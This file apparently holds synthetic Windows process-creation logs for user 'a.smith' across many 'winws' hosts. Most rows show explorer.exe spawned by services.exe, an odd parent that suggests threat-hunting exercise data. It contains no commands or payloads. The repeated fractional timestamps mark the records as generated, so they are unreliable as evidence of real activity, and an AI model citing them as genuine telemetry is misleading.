Hostname,Username,ProcessName,ProcessID,ParentProcessName,ParentProcessID,CommandLine,EventTimestamp
winws1235,a.smith,chrome.exe,14801,explorer.exe,5080,null,2025-09-15 08:29:21.456345 UTC
winws1091,a.smith,chrome.exe,21501,explorer.exe,6550,null,2025-09-15 08:42:42.456345 UTC
winws1071,a.smith,chrome.exe,16501,explorer.exe,5450,null,2025-09-15 08:32:42.789678 UTC
winws0121,a.smith,chrome.exe,18401,explorer.exe,5860,null,2025-09-15 08:36:27.789678 UTC
winws0101,a.smith,chrome.exe,13401,explorer.exe,4760,null,2025-09-15 08:26:27.123012 UTC
winws1051,a.smith,chrome.exe,11501,explorer.exe,4350,null,2025-09-15 08:22:42.123012 UTC
winws0141,a.smith,chrome.exe,23401,explorer.exe,6960,null,2025-09-15 08:46:27.456345 UTC
winws0091,a.smith,chrome.exe,10901,explorer.exe,4210,null,2025-09-15 08:21:27.789678 UTC
winws1245,a.smith,chrome.exe,16101,explorer.exe,5360,null,2025-09-15 08:31:51.123012 UTC
winws1205,a.smith,chrome.exe,11101,explorer.exe,4260,null,2025-09-15 08:21:51.456345 UTC
winws1275,a.smith,chrome.exe,19801,explorer.exe,6180,null,2025-09-15 08:39:21.123012 UTC
winws1285,a.smith,chrome.exe,21101,explorer.exe,6460,null,2025-09-15 08:41:51.789678 UTC
winws0255,a.smith,explorer.exe,7000,services.exe,500,null,2025-09-15 08:46:48.789678 UTC
winws1212,a.smith,explorer.exe,4440,services.exe,500,null,2025-09-15 08:23:30.456345 UTC
winws0116,a.smith,explorer.exe,5590,services.exe,500,null,2025-09-15 08:33:57.123012 UTC
winws1292,a.smith,explorer.exe,6640,services.exe,500,null,2025-09-15 08:43:30.789678 UTC
winws0178,a.smith,explorer.exe,4850,services.exe,500,null,2025-09-15 08:27:18.789678 UTC
winws1086,a.smith,explorer.exe,6270,services.exe,500,null,2025-09-15 08:40:12.789678 UTC
winws0237,a.smith,explorer.exe,6500,services.exe,500,null,2025-09-15 08:42:18.789678 UTC
winws0217,a.smith,explorer.exe,5950,services.exe,500,null,2025-09-15 08:37:18.456345 UTC
winws1104,a.smith,explorer.exe,7260,services.exe,500,null,2025-09-15 08:49:12.789678 UTC
winws0171,a.smith,explorer.exe,4670,services.exe,500,null,2025-09-15 08:25:33.123012 UTC
winws0263,a.smith,explorer.exe,7220,services.exe,500,null,2025-09-15 08:48:48.123012 UTC
winws0030,a.smith,explorer.exe,4300,services.exe,500,null,2025-09-15 08:05:15.789012 UTC
winws0096,a.smith,explorer.exe,4490,services.exe,500,null,2025-09-15 08:23:57.456345 UTC
winws0208,a.smith,explorer.exe,5680,services.exe,500,null,2025-09-15 08:34:48.789678 UTC
winws0266,a.smith,explorer.exe,7310,services.exe,500,null,2025-09-15 08:49:33.123012 UTC
winws1232,a.smith,explorer.exe,4990,services.exe,500,null,2025-09-15 08:28:30.789678 UTC
winws0247,a.smith,explorer.exe,6780,services.exe,500,null,2025-09-15 08:44:48.456345 UTC
winws0198,a.smith,explorer.exe,5400,services.exe,500,null,2025-09-15 08:32:18.123012 UTC
winws0106,a.smith,explorer.exe,5040,services.exe,500,null,2025-09-15 08:28:57.789678 UTC
winws0230,a.smith,explorer.exe,6320,services.exe,500,null,2025-09-15 08:40:33.123012 UTC
winws0158,a.smith,explorer.exe,4300,services.exe,500,null,2025-09-15 08:22:18.456345 UTC
winws1056,a.smith,explorer.exe,4620,services.exe,500,null,2025-09-15 08:25:12.789678 UTC
winws0188,a.smith,explorer.exe,5130,services.exe,500,null,2025-09-15 08:29:48.456345 UTC
winws1076,a.smith,explorer.exe,5720,services.exe,500,null,2025-09-15 08:35:12.456345 UTC
winws0227,a.smith,explorer.exe,6230,services.exe,500,null,2025-09-15 08:39:48.123012 UTC
winws0191,a.smith,explorer.exe,5220,services.exe,500,null,2025-09-15 08:30:33.456345 UTC
winws0168,a.smith,explorer.exe,4580,services.exe,500,null,2025-09-15 08:24:48.123012 UTC
winws0136,a.smith,explorer.exe,6690,services.exe,500,null,2025-09-15 08:43:57.789678 UTC
winws1308,a.smith,explorer.exe,7080,services.exe,500,null,2025-09-15 08:47:30.456345 UTC
winws1066,a.smith,explorer.exe,5170,services.exe,500,null,2025-09-15 08:30:12.123012 UTC
winws1272,a.smith,explorer.exe,6090,services.exe,500,null,2025-09-15 08:38:30.456345 UTC
